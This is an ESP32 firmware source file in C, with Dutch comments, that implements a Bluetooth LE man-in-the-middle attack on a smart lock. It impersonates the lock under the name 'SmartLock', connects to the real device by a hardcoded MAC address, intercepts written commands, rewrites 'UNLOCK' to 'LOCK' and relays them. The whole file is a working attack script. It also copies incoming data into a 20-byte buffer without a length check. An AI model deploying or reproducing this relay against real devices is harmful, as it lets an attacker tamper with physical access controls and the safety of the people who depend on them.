#include <stdio.h>
#include <string.h>
#include "nvs_flash.h"
#include "esp_log.h"

#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_gatts_api.h"
#include "esp_gattc_api.h"
#include "esp_bt_main.h"

#define TAG "MITM"

// UUIDs (zelfde als jouw echte ESP)
#define SERVICE_UUID 0x1234
#define CHAR_UUID    0xABCD

// 🔴 MAC adres van echte ESP (pas aan!)
static esp_bd_addr_t target_device = {0x4C,0xC3,0x82,0x0C,0x40,0xC6};

static esp_gatt_if_t client_if;
static uint16_t conn_id;
static uint16_t char_handle;

// =======================
// MITM LOGIC
// =======================
void process_and_forward(uint8_t *data, uint16_t len) {
    char cmd[20] = {0};
    memcpy(cmd, data, len);

    ESP_LOGI(TAG, "📥 Intercepted: %s", cmd);

    // 😈 manipulatie
    if (strcmp(cmd, "UNLOCK") == 0) {
        ESP_LOGI(TAG, "😈 Changing UNLOCK -> LOCK");
        strcpy(cmd, "LOCK");
    }

    // stuur door naar echte ESP
    esp_ble_gattc_write_char(client_if,
                             conn_id,
                             char_handle,
                             strlen(cmd),
                             (uint8_t *)cmd,
                             ESP_GATT_WRITE_TYPE_RSP,
                             ESP_GATT_AUTH_REQ_NONE);

    ESP_LOGI(TAG, "📤 Forwarded: %s", cmd);
}

// =======================
// GATT SERVER (fake device)
// =======================
static void gatts_event_handler(esp_gatts_cb_event_t event,
                                esp_gatt_if_t gatts_if,
                                esp_ble_gatts_cb_param_t *param) {

    switch (event) {

    case ESP_GATTS_REG_EVT:
        ESP_LOGI(TAG, "Fake SmartLock started");

        esp_ble_gap_set_device_name("SmartLock");

        esp_gatt_srvc_id_t service_id = {
            .is_primary = true,
            .id.inst_id = 0,
            .id.uuid.len = ESP_UUID_LEN_16,
            .id.uuid.uuid.uuid16 = SERVICE_UUID,
        };

        esp_ble_gatts_create_service(gatts_if, &service_id, 4);
        break;

    case ESP_GATTS_CREATE_EVT:
        esp_ble_gatts_start_service(param->create.service_handle);

        esp_bt_uuid_t char_uuid = {
            .len = ESP_UUID_LEN_16,
            .uuid.uuid16 = CHAR_UUID,
        };

        esp_ble_gatts_add_char(param->create.service_handle,
                               &char_uuid,
                               ESP_GATT_PERM_WRITE,
                               ESP_GATT_CHAR_PROP_BIT_WRITE,
                               NULL,
                               NULL);
        break;

    case ESP_GATTS_WRITE_EVT:
        process_and_forward(param->write.value, param->write.len);
        break;

    default:
        break;
    }
}

// =======================
// GATT CLIENT (connect naar echte ESP)
// =======================
static void gattc_event_handler(esp_gattc_cb_event_t event,
                                esp_gatt_if_t gattc_if,
                                esp_ble_gattc_cb_param_t *param) {

    switch (event) {

    case ESP_GATTC_REG_EVT:
        client_if = gattc_if;

        esp_ble_gap_start_scanning(30);
        break;

    case ESP_GATTC_CONNECT_EVT:
        conn_id = param->connect.conn_id;
        ESP_LOGI(TAG, "Connected to real ESP");
        break;

    case ESP_GATTC_SEARCH_CMPL_EVT:
        ESP_LOGI(TAG, "Service found");
        // ⚠️ hier moet je normaal char_handle ophalen
        // voor nu hardcoded test (kan later fixen)
        char_handle = 0x002a;
        break;

    default:
        break;
    }
}

// =======================
// GAP handler (scan)
// =======================
static void gap_event_handler(esp_gap_ble_cb_event_t event,
                              esp_ble_gap_cb_param_t *param) {

    if (event == ESP_GAP_BLE_SCAN_RESULT_EVT) {
        if (memcmp(param->scan_rst.bda, target_device, 6) == 0) {
            ESP_LOGI(TAG, "Found real ESP");

            esp_ble_gap_stop_scanning();
            esp_ble_gattc_open(client_if, target_device, true);
        }
    }
}

// =======================
// MAIN
// =======================
void app_main(void) {

    nvs_flash_init();

    esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);

    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_bt_controller_init(&bt_cfg);
    esp_bt_controller_enable(ESP_BT_MODE_BLE);

    esp_bluedroid_init();
    esp_bluedroid_enable();

    // register callbacks
    esp_ble_gatts_register_callback(gatts_event_handler);
    esp_ble_gattc_register_callback(gattc_event_handler);
    esp_ble_gap_register_callback(gap_event_handler);

    esp_ble_gatts_app_register(0);
    esp_ble_gattc_app_register(0);

    ESP_LOGI(TAG, "MITM ESP started");
}